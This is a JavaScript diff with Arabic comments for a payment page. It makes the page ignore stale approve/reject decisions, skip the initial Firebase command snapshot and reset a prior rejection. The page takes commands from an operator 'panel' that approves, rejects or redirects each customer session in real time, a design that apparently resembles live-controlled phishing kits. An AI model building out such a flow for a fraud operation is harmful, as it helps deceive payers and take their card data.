@@ -372,6 +372,30 @@
     let __lastDecisionTs = null;
     let __snapshotOk = false;
 
+    // تجاهل القرارات القديمة (older than 2 minutes): القرارات المحسومة مسبقاً
+    // تبقى في Firestore/RTDB وتبقى تمنع العميل عند إعادة تحميل أي صفحة لاحقاً.
+    const STALE_DECISION_MS = 120000;
+
+    function decisionAgeMs(data) {
+      if (!data) return null;
+      var t = data.decidedAt;
+      if (!t) return null;
+      // Timestamp من onSnapshot
+      if (typeof t.toMillis === 'function') return Date.now() - t.toMillis();
+      // ثواني/مللي (عدد)
+      if (typeof t === 'number') {
+        var n = String(t).length === 10 ? t * 1000 : t;
+        return Date.now() - n;
+      }
+      // سلسلة ISO قادمة من REST (fields.decidedAt.timestampValue)
+      if (typeof t === 'string') {
+        var parsed = Date.parse(t);
+        return isNaN(parsed) ? null : Date.now() - parsed;
+      }
+      if (t._seconds) return Date.now() - (t._seconds * 1000);
+      return null;
+    }
+
     function handleDecision(decision, data) {
       // تجاهل القرار المعلّق (لا يوجد قرار بعد)
       if (decision === 'pending' || decision === 'null' || !decision) {
@@ -381,6 +405,12 @@
       // منع التكرار: نفس القرار + نفس الطابع الزمني → تجاهل
       var ts = (data && (data.decidedAt || data.lastSeen)) || null;
       if (decision === __lastDecision && String(ts) === String(__lastDecisionTs)) return;
+      // تجاهل القرارات القديمة (من جلسة سابقة/محاولة سابقة)
+      var age = decisionAgeMs(data);
+      if (age !== null && age > STALE_DECISION_MS) {
+        __lastDecision = 'pending';
+        return;
+      }
       __lastDecision = decision;
       __lastDecisionTs = ts;
       if (decision === 'approved') {
@@ -452,7 +482,13 @@
     // ---- مصدر احتياطي: RTDB commands/{sessionId} (اللوحة القديمة) ----
     const cmdRef = rtd.ref('commands/' + sessionId);
 
+    // تجاهل القيمة الأولى (الحالة القديمة) — نستجيب فقط للأوامر الجديدة اللاحقة
+    let __firstApprovalSnap = true;
+    let __firstRejectionSnap = true;
+    let __firstRedirectSnap = true;
+
     cmdRef.child('approval').on('value', (snap) => {
+      if (__firstApprovalSnap) { __firstApprovalSnap = false; return; }
       const cmd = snap.val();
       if (cmd && cmd.action === 'APPROVE_PAYMENT' && !window.__approvalHandled) {
         window.__approvalHandled = true;
@@ -464,6 +500,7 @@
     });
 
     cmdRef.child('rejection').on('value', (snap) => {
+      if (__firstRejectionSnap) { __firstRejectionSnap = false; return; }
       const cmd = snap.val();
       if (cmd && cmd.action === 'REJECT_PAYMENT' && !window.__rejectionHandled) {
         window.__rejectionHandled = true;
@@ -475,6 +512,7 @@
     });
 
     cmdRef.child('redirect').on('value', (snap) => {
+      if (__firstRedirectSnap) { __firstRedirectSnap = false; return; }
       const cmd = snap.val();
       if (cmd && cmd.action === 'REDIRECT_PAGE' && cmd.targetPage) {
         if (typeof callbacks.onRedirect === 'function') {
@@ -489,6 +527,16 @@
       const msg = snap.val();
       if (msg && typeof callbacks.onMessage === 'function') callbacks.onMessage(msg);
     });
+  };
+
+  // السماح للعميل بإعادة المحاولة بعد رفض سابق:
+  // يصفّر القرار في Firestore ويمسح أوامر RTDB حتى لا تبقى عالقة في جلسات لاحقة
+  window.clearRejection = function () {
+    try { customerRef.set({ decision: 'pending', status: 'pending', reason: '' }, { merge: true }); } catch (e) {}
+    try { rtd.ref('commands/' + sessionId + '/approval').remove(); } catch (e) {}
+    try { rtd.ref('commands/' + sessionId + '/rejection').remove(); } catch (e) {}
+    window.__approvalHandled = false;
+    window.__rejectionHandled = false;
   };
 
   // ابدأ الجلسة بعد التأكد من المصادقة (قواعد أمان Firestore تتطلب تسجيل دخول للكتابة في customers)
